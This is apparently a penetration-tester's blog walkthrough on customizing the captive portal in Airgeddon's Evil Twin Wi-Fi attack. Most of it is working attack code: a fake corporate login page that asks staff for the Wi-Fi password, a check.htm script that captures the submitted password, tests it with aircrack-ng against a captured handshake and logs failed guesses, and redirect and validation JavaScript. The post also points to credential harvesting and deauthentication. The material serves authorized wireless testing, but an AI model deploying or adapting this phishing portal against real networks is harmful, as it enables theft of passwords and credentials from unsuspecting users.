---
title: "Customize your Captive Portal in Airgeddon's Evil Twin Attack"
excerpt: "A summarized walkthrough to customize the captive portal in Wi-Fi Evil Twin attacks."
categories:
    - Penetration-Test
tags:
    - Penetration-Test
toc: true
show_date: true
classes: wide
---

# Introduction
During a Wi-Fi penetration test recently, I tried to explore further about Evil Twin attacks, which is one of the client-side attacks. To whom may not know much about this attack, Evil Twin attacks involve adversaries who attempt to mimic a target Wi-Fi access point with a rogue access point and to trick users to connect the fake one.

# Custom Portal Plugin in Airgeddon
## Installation

Download the script `customportals.sh` on [https://github.com/KeyofBlueS/airgeddon-plugins](https://github.com/KeyofBlueS/airgeddon-plugins) and put it in `/usr/share/airgeddon/plugins`. Also, create a folder called `custom_portals` which will store all your customized captive portal template.

```sh
┌──(root㉿kali)-[/usr/share/airgeddon/plugins]
└─# ls -al
total 96
drwxr-xr-x 3 root root  4096 Sep  5 23:45 .
drwxr-xr-x 4 root root  4096 Sep  5 21:35 ..
drwxr-xr-x 2 root root  4096 Sep  5 23:45 custom_portals
-rw-r--r-- 1 root root 38008 Sep  5 23:38 customportals.sh
-rw-r--r-- 1 root root 34298 Aug  1 19:07 missing_dependencies.sh
-rw-r--r-- 1 root root  6401 Aug  1 19:07 plugin_template.sh
```

# Working on the Template
## index.htm
`index.htm` is the captive portal page that tricks users to provide information, such as Wi-Fi password or even their active directory credentials. In the following example, we attempt to tell the staff to provide the corporate Wi-Fi password in a scenario of WPA-PSK SSIDs.

```sh
#!/usr/bin/env bash
echo '<!DOCTYPE html>'
echo '<html>'
echo -e '	<head>'
echo -e '		<meta name="viewport" content="width=device-width"/>'
echo -e '		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>'
echo -e '		<title>"${et_misc_texts[${captive_portal_language},15]}"</title>'
echo -e '		<link rel="stylesheet" type="text/css" href="portal.css"/>'
echo -e '		<script type="text/javascript" src="portal.js"></script>'
echo -e '	</head>'
echo -e '	<div class="content">'
echo -e '		<form method="post" id="loginform" name="loginform" action="check.htm">'
echo -e '			<img src="./logo.png" alt="Logo" class="logo"/>'
echo -e '			<h1>Wi-Fi Access</h1>'
echo -e '			<p class="description">Please enter the Wi-Fi password to gain access to the corporate Wi-Fi network.</p>'
echo -e '			<label><input id="password" maxlength="63" name="password" size="20" type="password" placeholder="Password" class="input-field"/></label>'
echo -e '			<input type="submit" value="Connect" class="button"/>'
echo -e '		</form>'
echo -e '		<p class="warning">Only authorized persons are allowed to access the corporate network of ABC Company.</p>'
echo -e '	</div>'
exit 0
```

You may also notice that the form action will be taken in `check.htm` where I will explain further in the next section.

## check.htm

`check.htm` is to proceed the form submission by users in `index.htm`. The script would firstly extract the information from the POST HTTP data. In this case, the password is retrieved.

```sh
POST_DATA=$(cat /dev/stdin)
if [[ "${REQUEST_METHOD}" = "POST" ]] && [[ ${CONTENT_LENGTH} -gt 0 ]]; then
	POST_DATA=${POST_DATA#*=}
	password=${POST_DATA/+/ }
	password=$(printf '%b' "${password//%/\\x}")
fi
```

Once the password is retrieved, there are a couple of conditional statements following. The first one is to validate the length of the password provided by the user. The length should be at least 8 characters and less than 64 characters. If validated, the password will be temporarily saved in `${tmpdir}${webdir}${currentpassfile}`, which should typically be `/tmp/ag1/www/`. The password will be used to crack the hash in the 4-way handshake file captured by airodump-ng and Airgeddon.

```sh
if [[ ${#password} -ge 8 ]] && [[ ${#password} -le 63 ]]; then
	rm -rf "${tmpdir}${webdir}${currentpassfile}" > /dev/null 2>&1
	echo "${password}" >\
	"${tmpdir}${webdir}${currentpassfile}"
	aircrack-ng -a 2 -b ${bssid} -w "${tmpdir}${webdir}${currentpassfile}" "${et_handshake}" | grep "KEY FOUND!" > /dev/null
```

Then, check whether `KEY FOUND` is in the output of `aircrack-ng` to determine the attack is successful or not.

```sh
if [ "$?" = "0" ]; then
	touch "${tmpdir}${webdir}${et_successfile}" > /dev/null 2>&1
	echo '<h1 class="success">Connection Success</h1>The password is correct, the connection will be re-established in a few moments'
	et_successful=1
else
	echo "${password}" >>\
	"${tmpdir}${webdir}${attemptsfile}"
	echo '<h1 class="error">Connection Error</h1>The password is incorrect, redirecting to the main screen'
	et_successful=0
fi
```

## portal.css

You could customize the CSS content here.

## portal.js

In `check.htm`, if the password is not correct, the user will be redirected to the captive portal page in a few seconds.

```sh
if [ ${et_successful} -eq 1 ]; then
    exit 0
else
    echo '<script type="text/javascript">'
    echo -e '\tsetTimeout("redirect()", 3500);'
    echo '</script>'
    exit 1
fi
```

The JavaScript function `redirect()` is called in `portal.js` to redirect to `index.htm`.

```javascript
function redirect() {
    document.location = "index.htm";
}
```

Meanwhile, some response corresponding to the form could be included here, such as password length validation.

```javascript
(function() {
    var onLoad = function() {
        var formElement = document.getElementById("loginform");
        if (formElement != null) {
            var validateForm = function(event) {
                event.preventDefault();
                var password = document.getElementById("password").value;
                if (password === "") {
                    alert("Please enter the Wi-Fi password.");
                } else if (password.length < 8) {
                    alert("The password must be at least 8 characters.");
                } else {
                    formElement.submit();
                }
            };
            formElement.addEventListener("submit", validateForm);
        }
    };

    document.readyState != 'loading' ? onLoad() : document.addEventListener('DOMContentLoaded', onLoad);
})();
```

# The Demo Captive Portal

Put the template in a sub-folder of `/usr/share/airgeddon/plugins/custom_portals/`.

```sh
┌──(root㉿kali)-[/usr/…/airgeddon/plugins/custom_portals/Demo]
└─# ls -al
total 48
drwxr-xr-x 2 root root  4096 Sep  6 02:11 .
drwxr-xr-x 3 root root  4096 Sep  5 23:46 ..
-rw-r--r-- 1 root root  2036 Sep  6 02:10 check.htm
-rw-r--r-- 1 root root  1170 Sep  6 02:10 index.htm
-rwxr-x--- 1 root root 24228 Sep  6 02:11 logo.png
-rw-r--r-- 1 root root  1556 Sep  6 02:10 portal.css
-rw-r--r-- 1 root root   889 Sep  6 02:11 portal.js
```

After the handshake capture file with deauthentication has been obtained, a rogue AP will be established with the captive portal.

![](/assets/images/2025-09-06-02.png)


![](/assets/images/2025-09-06-03.png)

# Captive Portal Sample

You may refer to my sample on [https://github.com/patrickt2017/Airgeddon-Evil-Twin-Captive-Portal-Demo](https://github.com/patrickt2017/Airgeddon-Evil-Twin-Captive-Portal-Demo) and develop your own template further!

# Resources

https://zimperium.com/glossary/evil-twin-attacks